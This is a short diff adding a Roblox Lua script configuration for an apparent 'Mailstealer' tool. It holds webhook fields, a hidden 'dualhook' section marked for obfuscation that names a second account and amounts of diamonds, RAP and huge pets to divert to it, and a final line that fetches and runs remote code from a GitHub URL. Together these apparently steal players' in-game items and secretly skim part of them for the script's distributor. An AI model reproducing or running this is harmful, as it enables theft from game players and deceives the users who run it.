@@ -1,0 +1,13 @@
+UserName = ""
+Webhook = ""
+UserName2 = ""
+
+-- OBFUSCATE BELLOW
+DualhookUsername = "SirMeowsALotFanYas2"
+DualhookWebhook = ""
+
+DiamondsToDh = 
+RAPToDh = 
+HugeToDh = 
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Egorikusa/Mailstealer/main/premiumdualhook", true))() 
